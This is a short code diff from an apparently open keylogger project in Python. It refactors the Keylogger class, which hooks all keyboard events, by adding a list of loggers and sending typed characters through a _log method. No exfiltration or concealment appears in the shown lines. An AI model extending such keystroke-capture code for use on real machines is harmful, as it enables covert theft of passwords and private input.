@@ -4,6 +4,8 @@ import keylogger_logger
 
 class Keylogger:
     def __init__(self):
+        self.loggers = []
+
         keyboard.hook(callback=self._log_event)
 
     def __del__(self):
@@ -39,7 +41,7 @@ class Keylogger:
         
         # regular character
         if len(name) == 1:
-            self.logger += name
+            self._log(name)
             return
 
         # not a character, special key (e.g ctrl, alt, etc.)
